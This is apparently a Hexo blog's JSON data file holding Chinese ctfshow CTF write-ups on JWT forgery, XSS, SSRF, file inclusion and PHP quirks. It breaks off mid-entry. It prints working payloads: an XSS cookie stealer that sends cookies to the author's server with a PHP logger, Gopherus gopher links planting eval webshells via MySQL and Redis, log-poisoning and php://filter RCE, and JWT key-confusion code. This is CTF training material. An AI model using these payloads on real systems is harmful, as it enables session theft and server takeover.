{"meta":{"title":"REZEのblog","subtitle":"我喜欢你","description":"菜鸡ctfer，各位师傅嘴下留情","author":"REZE","url":"http://example.com","root":"/"},"pages":[{"title":"标签页","date":"2018-01-04T16:00:00.000Z","updated":"2025-04-05T05:25:40.287Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-01-04T16:00:00.000Z","updated":"2025-04-05T05:28:08.940Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"ctfshow jwt(web345-350)已完结","slug":"CTFwp/ctfshow jwt(345-350)","date":"2025-08-29T16:00:00.000Z","updated":"2025-08-30T13:03:07.459Z","comments":true,"path":"2025/08/30/CTFwp/ctfshow jwt(345-350)/","permalink":"http://example.com/2025/08/30/CTFwp/ctfshow%20jwt(345-350)/","excerpt":"","text":"web345打开题目，只有一个where is flag? 用bp抓包一个，发现cookie有一串特别长的东西 eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NTY1NDEyMzcsImV4cCI6MTc1NjU0ODQzNywibmJmIjoxNzU2NTQxMjM3LCJzdWIiOiJ1c2VyIiwianRpIjoiZjEwYzg5ZWY1MjdkNTE2YmYwZWM4ZDAzODE1YTgyZjMifV0 用base64解码一下，发现 &#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;.[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1756541237,&quot;exp&quot;:1756548437,&quot;nbf&quot;:1756541237,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;f10c89ef527d516bf0ec8d03815a82f3&quot;&#125;] 将user修改为admin，重新编码，发送回cookie，得到flag web346-347跟上一题一样抓包，用base64解码一下 发现这次后面多了很多乱码，这是说明进行过加密 放入在线jwt解析网址，对称加密123456，将user修改为admin，重新加密回去 发回cookie，得到flag web348题目提示爆破，我们使用c-jwt-cracker工具进行爆破 ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NjU0Mjg1MywiZXhwIjoxNzU2NTUwMDUzLCJuYmYiOjE3NTY1NDI4NTMsInN1YiI6InVzZXIiLCJqdGkiOiJiNmU3Y2FkNTg2NzU3ZjU1YTI0NGZmMTIxNjI3ODUwMSJ9.hdMlqVnQEhQmqB2UdwPL4-Hr8iKqb0AMaTT16rLWRcASecret is &quot;aaab&quot; 显示密码aaab，用在线jwt网站，对称加密，发回cookie，得到flag web349题目给了附件 /* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var privateKey = fs.readFileSync(process.cwd()+&#x27;//public//private.key&#x27;); var token = jwt.sign(&#123; user: &#x27;user&#x27; &#125;, privateKey, &#123; algorithm: &#x27;RS256&#x27; &#125;); res.cookie(&#x27;auth&#x27;,token); res.end(&#x27;where is flag?&#x27;); &#125;);router.post(&#x27;/&#x27;,function(req,res,next)&#123; var flag=&quot;flag_here&quot;; res.type(&#x27;html&#x27;); var auth = req.cookies.auth; var cert = fs.readFileSync(process.cwd()+&#x27;//public/public.key&#x27;); // get public key jwt.verify(auth, cert, function(err, decoded) &#123; if(decoded.user===&#x27;admin&#x27;)&#123; res.end(flag); &#125;else&#123; res.end(&#x27;you are not admin&#x27;); &#125; &#125;);&#125;); 发现有公钥和私钥的泄露，下载得到公钥和私钥 将公钥和私钥填入，修改user，发回cookie，得到flag web350这里能得到公钥，但找不到私钥 应该是对称密码，附上exp，将RS256加密改为HS256 import jwtjwt_payload=&#123; &quot;user&quot;: &quot;admin&quot;, &quot;iat&quot;: 1756543363&#125;pub=open(&quot;D:\\public.key&quot;,&quot;rb&quot;).read()jwt_headers=&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;jwt_token=jwt.encode(jwt_payload,key=pub,algorithm=&#x27;HS256&#x27;,headers=jwt_headers,)print(jwt_token) 得到jwt，发回cookie。post请求，得到flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow xss(web316-333)更新中","slug":"CTFwp/ctfshow xss(316-333)","date":"2025-08-29T16:00:00.000Z","updated":"2025-08-30T08:05:33.434Z","comments":true,"path":"2025/08/30/CTFwp/ctfshow xss(316-333)/","permalink":"http://example.com/2025/08/30/CTFwp/ctfshow%20xss(316-333)/","excerpt":"","text":"前言：要做xss，最好是有一个自己的公网服务器，当然也可以选择内网穿透 这里我选择的是phpstudy+花生壳内网穿透 web316首先打开页面，让我们输入内容 尝试输入 &lt;script&gt;alert(&#x27;111&#x27;);&lt;/script&gt; 出现alert网页消息，说明存在xss漏洞 首先尝试查看cookie &lt;script&gt;alert(document.cookie);&lt;/script&gt; 结果显示： PHPSESSID=2jmcsr1d43u48on5b969kqgdg3; flag=you%20are%20not%20admin%20no%20flag 说明我们需要获得cookie并注入，得到真正的flag 首先需要脚本 &lt;?php $cookie = $_GET[&#x27;cookie&#x27;]; $time = date(&#x27;Y-m-d h:i:s&#x27;, time()); $log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;); fwrite($log,$time.&#x27;: &#x27;. $cookie . &quot;\\n&quot;); fclose($log);?&gt; 这个脚本旨在获取网站中的其他用户cookie，这里就是admin，将其保存在cookie.txt中 我们的xss语句： &lt;script&gt;location.href=&quot;ip/xss.php?coookie=&quot;+document.cookie&lt;/script&gt; 这样就能在本地的cookie.txt中查看到admin的cookie和flag web317-326从317到326，就全是弹cookie，增加过滤 最后得到一个增强版语句 &lt;svg/onload=&quot;location.href=&#x27;xxx/1.php?cookie=&#x27;-document.cookie&quot;/&gt; web327","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow ssrf(web351-360)已完结","slug":"CTFwp/ctfshow ssrf(351-360)","date":"2025-08-29T16:00:00.000Z","updated":"2025-08-30T13:38:50.807Z","comments":true,"path":"2025/08/30/CTFwp/ctfshow ssrf(351-360)/","permalink":"http://example.com/2025/08/30/CTFwp/ctfshow%20ssrf(351-360)/","excerpt":"","text":"web351&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; 拿到题目，第一题没有进行任何过滤 可以直接读取到flag url=127.0.0.1/flag.php web352-356一些过滤 法一： 进制转换 127.0.0.1=0x7F000001 法二： 增减 http://127.0.1/ http://0/ 法三： sudo.cc web357&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123; die(&#x27;scheme&#x27;);&#125;?&gt; scheme 这次上面的都不行了，我们采用302跳转 现在我们自己的服务器上写一个跳转文件 &lt;?phpheader(&quot;Location:http://127.0.0.1/flag.txt&quot;); 再用url指向我们的服务器中该文件 url=http://xxx/flag.php web358&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123; echo file_get_contents($url);&#125; 正则匹配 开头必须是 http://ctf. 结尾必须是 show 前面用@间隔，后面用#注释 url=http://ctf.@127.0.0.1/flag.php#show web359-360这两道题需要用到gopherus工具 web359拿到题目是一个登录页面，填点东西抓包一下 发现了有returl这个参数，是一个url，这里作为ssrf攻击点 python gopherus.py --exploit mysql ________ .__ / _____/ ____ ______ | |__ ___________ __ __ ______/ \\ ___ / _ \\\\____ \\| | \\_/ __ \\_ __ \\ | \\/ ___/\\ \\_\\ ( &lt;_&gt; ) |_&gt; &gt; Y \\ ___/| | \\/ | /\\___ \\ \\______ /\\____/| __/|___| /\\___ &gt;__| |____//____ &gt; \\/ |__| \\/ \\/ \\/ For making it work username should not be password protected!!!Give MySQL username: rootGive query to execute: select &quot;&lt;?php eval($_POST[]);?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27;Your gopher link is ready to do SSRF :gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%01%00%00%00%01 得到payload还不能直接使用，将gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_后面的内容进行一次url编码，之后再打入returl 之后即可直接访问1.php 执行rce或使用蚁剑链接 web360题目提示说打redis &gt;python gopherus.py --exploit redis ________ .__ / _____/ ____ ______ | |__ ___________ __ __ ______/ \\ ___ / _ \\\\____ \\| | \\_/ __ \\_ __ \\ | \\/ ___/\\ \\_\\ ( &lt;_&gt; ) |_&gt; &gt; Y \\ ___/| | \\/ | /\\___ \\ \\______ /\\____/| __/|___| /\\___ &gt;__| |____//____ &gt; \\/ |__| \\/ \\/ \\/ Ready To get SHELLWhat do you want?? (ReverseShell/PHPShell): phpGive web root location of server (default is /var/www/html):Give PHP Payload (We have default PHP Shell): &lt;?php eval($_POST[1]);?&gt;Your gopher link is Ready to get PHP Shell:gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 跟前面一样的操作，先进行编码，再打入url，最后再shell.php中执行rce或链接蚁剑","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow 文件包含(web78-88)更新中","slug":"CTFwp/ctfshow文件包含(web78-88,116-117)","date":"2025-07-30T16:00:00.000Z","updated":"2025-07-31T17:17:58.268Z","comments":true,"path":"2025/07/31/CTFwp/ctfshow文件包含(web78-88,116-117)/","permalink":"http://example.com/2025/07/31/CTFwp/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(web78-88,116-117)/","excerpt":"","text":"web78&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 10:52:43# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 最基础的文件包含，无过滤 使用日志包含或用伪协议读取 伪协议: data ?file=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;?file=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt; 日志包含 读取日志 ?file=/var/log/nginx/access.log 在ua里传入木马 &lt;?php eval($_POST[1]);?&gt; 再用post传递 1=system(tac f*); 得到flag ctfshow&#123;0e6d01fd-77ac-45e1-98c2-159ceb1c856e&#125; web79&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:10:14# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 相比于web78，将php换成了???，但不影响，flag.php可以用f*代替，可以用代替，日志包含也不会影响 得到flag ctfshow&#123;de034f27-e4ec-4763-9638-35f0885a7f99&#125; web80&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 相比于之前，data和php都被???替换，伪协议data不用再用了，我们可以使用日志包含做题 ，得到flag ctfshow&#123;d2af6629-fa72-42ec-b6fb-df73f7ec0e8e&#125; web81 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 15:51:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 过滤了:，但日志包含依旧可用 得到flag ctfshow&#123;fb772a9d-2522-407a-a0ed-dfae80740ad4&#125; web81&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 15:51:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 与上题相似，同样可用文件包含做 web82-86&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 19:34:45# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 小数点被过滤，日志包含不可用，这时需要用到session竞争 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;https://bec36ebc-5fc6-4c1b-8e6d-d4ae0a98374c.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; &lt;?phpsession_start();?&gt; 首先用html脚本传入一个cookie:PHPSESSID&#x3D;flag的文件，文件随便 用burpsuite传入并拦截，更改cookie后发到intruder，我们使用爆破攻击 无payload，资源池设置设置发送请求数，无限生成，就让他一直跑 接下来，在&#x2F;tmp目录下就会生成sess_flag的临时文件，内容就是我们传入的 访问?file&#x3D;&#x2F;temp&#x2F;sess_flag,依然用burpsuite拦截，发到intruder，资源池中发送请求数要大于前面的，两个一起跑，就能读取到内容 后续也通过修改html脚本中内容，实现rce，读取flag web87&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 21:57:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $content = $_POST[&#x27;content&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content); &#125;else&#123; highlight_file(__FILE__);&#125; 这题用的是 file_put_contents(),写入函数，将file先进行url解码，接着和 $content一起写入 我们肯定想到伪协议写入php文件，但这里file中开头会有一句，导致后面的content的语句无法运行，所以我们需要想办法，既然不能绕过，就得把这句话曲解掉 刚开始想的是用base64解码，后来发现前面的部分会连着后面，导致变成整体变成一坨 后面看到了string.rot13,这是一种偏移，偏移两次正好不变，所以将我们的RCE语句进行一次rot13偏移，这样再偏移一次，就变回了正常的rce语句 payload: GET:XXX/?file=php://fitler/write=string.rot13/resource=1.php 进行两次url编码，要是两次 GET:XXX/?file=php://fitler/write=string.rot13/resource=1.php%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%37%34%25%36%63%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30 这时候post传入偏移后的rce语句 POST:content=&lt;?cuc flfgrz(&#x27;yf&#x27;)?&gt; 之后查看url&#x2F;1.php即可 web88&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-17 02:27:25# @email: h1xa@ctfer.com# @link: https://ctfer.com */if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 过滤了一部分内容，但并没有过滤data 使用data伪协议，将后面的rce语句进行一次base64编码，但编码不能出现&#x3D;和+，只需要再语句后面补几个字母即可 payload: GET: url/?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmwqJyk/PmFh","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow php特性(web89-115,123-150)更新中","slug":"CTFwp/ctfshowphp特性web(89-115123-150)","date":"2025-07-29T16:00:00.000Z","updated":"2025-07-30T16:41:26.061Z","comments":true,"path":"2025/07/30/CTFwp/ctfshowphp特性web(89-115123-150)/","permalink":"http://example.com/2025/07/30/CTFwp/ctfshowphp%E7%89%B9%E6%80%A7web(89-115123-150)/","excerpt":"","text":"web89&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 就是说，传一个数，要是数，但不是阿拉伯数字， 使用数组绕过 原理是说，intval()函数，如过里面传的是数组，都会返回一个0，所以构造payload ?num[] 就行了，得到flag web90&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 传入一个值，首先不能直接等于4476，接着intval()后要等于4476，返回flag 采用进制转换 4476&#x3D;010574（八进制） 得到flag web91&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125; 就是说，传入字符串，进行两个正则检测，第一个检测多行，要带有”php”,第二个只检测一行，不能带”php”，那就用%0a进行一次换行 构造payload ?cmd=aaa%0aphp 得到flag web92&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:29:30# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 跟上面的差不多，进制转换还能做 web93一样的，用进制转化做 web94&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:46:19# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125; 开头不能带0，但可以搞个正号+，就绕过去了 web95&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:53:59# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; no no no!!! 坏了，符号不给用了，那就用空格，前面直接加个空格就行 web96&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 19:21:24# @link: https://ctfer.com*/highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 我们来猜一下默认路径 u=/var/www/html/flag.php 就有flag了， 看了别的方法，有加.&#x2F;的，有用filter伪协议读取的 web97&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 19:36:32# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; 就是说，post传俩值，要表面不同，md5后相同 用数组，因为数组不能md5，md5的值都是null a[]=1&amp;b[]=2 得到flag web98&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 21:39:27# @link: https://ctfer.com*/include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; $_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;; 当$_GET不为空时，$_GET中内容引用为&amp;_POST中内容 中间两行基本没用，所以我们只需要让get传参不为空，在用post传参，使[‘HTTP_FLAG’]&#x3D;&#x3D;’flag’即可 payload: GET: XXX&#x2F;?flag&#x3D;flag POST: HTTP_FLAG&#x3D; flag web99&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 22:36:12# @link: https://ctfer.com*/highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; 开局先创建一个数组，后面生成的随机数会存放在这个数组中 接着开始生成随机数，并把随机数存放在数组中 下面if判断，get传参n不为空，接下来有一个 in_array($_GET[&#x27;n&#x27;], $allow) 要求n在这个数组中，就是要求n的值需要等于随机值，接下来会把post的值写入n中 这里in_array()存在弱比较漏洞，如果数组中存在1，即使n&#x3D;1.php也会被判定为n在数组中 payload:GET: xxx/?n=1.phpPOST: content=&lt;?php eval($_POST[1])?&gt; 多执行几次，基本都会随机出1，接下来访问1.php，进行rce，得到flag web100&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-21 22:10:28# @link: https://ctfer.com*/highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt;&#125; 题目直接说flag在ctfshow这个类中 这题的漏洞在于 $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 看似是一个判断语句，要求v1，v2，v3都需要是数，实际上，因为中间用and连接，这其实是一个赋值式，将v1是否为数字赋值给v0，至于v2，v3,完全无关 接下来，需要v1是数字，v2中不含’;’，v3中必须含’;’ eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); 我们得想办法构造rce语句，想到v2，v3中间中注释，把(‘ctfshow’)就注释掉 payload:GET: v1=1&amp;v2=system(&#x27;ls&#x27;) /* &amp;v3= */; 后面执行rce得到flag web101&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-22 00:26:48# @link: 